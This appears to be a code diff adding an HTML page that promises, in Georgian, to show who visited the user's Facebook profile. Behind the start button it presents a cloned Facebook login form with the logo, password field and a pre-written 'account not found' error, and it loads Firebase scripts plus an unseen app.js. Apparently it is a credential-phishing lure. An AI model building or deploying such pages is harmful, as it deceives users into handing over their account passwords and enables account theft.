@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="./assets/img/logo.png"
+      type="image/x-icon" />
+    <link rel="stylesheet" href="./css/style.css" />
+    <title>გაიგე ვინ ესტუმრა შენი ფეისბუკის პროფილს</title>
+  </head>
+  <body>
+    <div class="start-wrapper">
+      <img class="eye-img" src="./assets/img/logo.png" alt="" />
+      <h1>
+        ამ აპლიკაციის საშუალებით თქვენ გაიგებთ თუ ვინ ეწვია თქვენს ფეისბუკის
+        პროფილს.
+      </h1>
+      <button class="start">დაწყება</button>
+    </div>
+    <div class="second-wrapper hidden">
+      <div class="error-wrapper hidden">
+        <p>
+          The email or phone number you’ve entered doesn’t match any account.
+          Sign up for an account.
+        </p>
+      </div>
+      <img class="fb-img" src="./assets/img/fb-logo.png" alt="" />
+      <div class="input-wrapper">
+        <input class="user" type="text" placeholder="Mobile number or email" />
+        <input class="psw" type="password" placeholder="Password" />
+        <button class="login-btn">Log in</button>
+        <p class="forgot">
+          <a
+            href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_07egFXUBGm7WwItHl&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0JvTAGEUU2fuw6ecv&_rdr"
+            >Forgot password?</a
+          >
+        </p>
+        <div class="or-lines">
+          <hr />
+          <p>OR</p>
+          <hr />
+        </div>
+      </div>
+      <button class="create-acount-btn">Create new account</button>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase.js"></script>
+    <script src="./js/app.js"></script>
+  </body>
+</html>
